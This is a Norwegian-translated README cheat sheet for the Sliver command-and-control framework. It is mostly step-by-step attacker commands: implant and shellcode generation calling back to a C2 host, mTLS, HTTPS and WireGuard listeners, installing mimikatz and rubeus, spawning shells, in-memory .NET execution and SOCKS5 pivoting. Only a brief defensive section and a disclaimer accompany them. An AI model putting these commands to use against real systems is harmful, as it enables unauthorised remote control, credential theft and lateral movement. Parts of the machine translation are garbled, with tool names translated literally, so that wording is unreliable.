<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
</p>

<p align="center">
  <b>⚔️ Moderne motstanderemulering på tvers av plattformer med åpen kildekode og kommando- og kontrollramme som støtter mTLS, WireGuard, HTTP(S) og DNS-protokoller</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og arkitektur](#-oversikt--arkitektur)
- [Installasjon og serveroppsett](#-installasjon--serveroppsett)
  - [Automatisert One-Liner-installasjon](#automated-one-liner-install)
  - [Multiplayer Operator Configuration](#multiplayer-operator-configuration)
- [Listener Configuration (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Genererende implantater (Beacons vs Sessions)](#-generating-implants-beacons-vs-sessions)
  - [Interactive Sessions vs Asynchronous Beacons](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE & Shellcode Implants](#windows-exe--shellcode-implants)
  - [Linux og macOS ELF-implantater](#linux--macos-elf-implantater)
- [Post-Exploitation & Armory Ecosystem](#-post-exploitation--armory-økosystem)
  - [Installing Armory Extensions (BOFs, Donut, Seatbelt)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [Legitimasjonstilgang og Mimikatz](#legitimasjonstilgang--mimikatz)
  - [Pivoting & Dynamic SOCKS5](#pivoting--dynamic-socks5)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og arkitektur

Konstruert i Go av **Bishop Fox**, **Sliver** er et av de fremste åpen kildekode-alternativene til kommersielle C2-rammeverk (Cobalt Strike, Brute Ratel):
- **Cross-Platform:** Server og implantater støtter Windows, Linux og macOS på tvers av `x86_64`, `arm64` og `arm`.
- **Unvikende kommunikasjon:** Ut-av-boksen-støtte for gjensidig TLS (mTLS), WireGuard UDP-tunneler, HTTP/HTTPS med prosedyregenerering av kanarifugler og DNS-tunnelering.
- **In-Memory Execution:** Native reflekterende DLL-injeksjon, Beacon Object Files (BOFs), innebygd .NET-kjøring via Donut og prosessuthuling.
- **Multiplayer Architecture:** Samarbeid i sanntid mellom flere røde teamoperatører via kryptografisk signerte operatørprofiler.

---

## 📥 Installasjon og serveroppsett

### Automatisk One-Liner-installasjon
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Multiplayer Operator Configuration
Opprett en operatørprofil på C2-serveren for et teammedlem:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Lytterkonfigurasjon (mTLS, HTTP, WireGuard, DNS)

Inne i `sliver`-konsollen:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Generering av implantater (Beacons vs Sessions)

### Interaktive økter vs asynkrone beacons
- **Session:** Sanntids TCP/TLS-tilkobling med øyeblikkelig kommandorespons. Høyere nettverkssynlighet.
- **Beacon:** Asynkron hjerterytme som sover i intervaller med randomisert jitter. Dramatisk vanskeligere for SOC-er å identifisere via nettverksavviksanalyse.

### Windows EXE og Shellcode-implantater
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Linux- og macOS ELF-implantater
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Økosystem etter utnytting og våpenlager

### Installere Armory Extensions (BOFs, smultring, sikkerhetsbelte)
The Armory er Slivers integrerte pakkebehandling for støtende tredjepartsverktøy og Cobalt Strike Beacon Object Files (BOFs):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interaksjon med økter og beacons
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### Pivoterende og dynamiske SOCKS5
Rut eksterne offensive verktøy direkte inn i det kompromitterte målnettverket:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Start mTLS Listener** | `mtls --lport 8888` |
| **Start HTTPS Listener** | `https --lport 443 --domain c2.domain.com` |
| **Generer Session EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Generer Beacon EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Generer rå skallkode** | `generate --mtls <IP>:8888 -f shellcode` |
| **Liste og samhandle økter**| `sessions` -> `use <ID>` |
| **Installer Armory Tools** | `armory install seatbelt mimikatz` |
| **In-Memory .NET Execution**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Reverse Proxy** | `socks5 start --port 1080` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **JARM-fingeravtrykk:** Standard Sliver HTTP-lyttere kan profileres ved å bruke aktiv JARM TLS-fingeravtrykk. Tilpass TLS-chiffer i Sliver-konfigurasjon.
2. **YARA og binær analyse:** Standardimplantater produsert av `generate` inneholder Golang-metadata og symbolstrukturer med mindre de er tilsløret via forvanskning (`--skip-symbols`).

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Sliver er en avansert motstandersimulering og kommando- og kontrollramme for rødt team. Den skal utelukkende brukes i autoriserte engasjementer med klare regler for engasjement (RoE). Uautorisert bruk på tredjeparts datamaskiner er strengt ulovlig.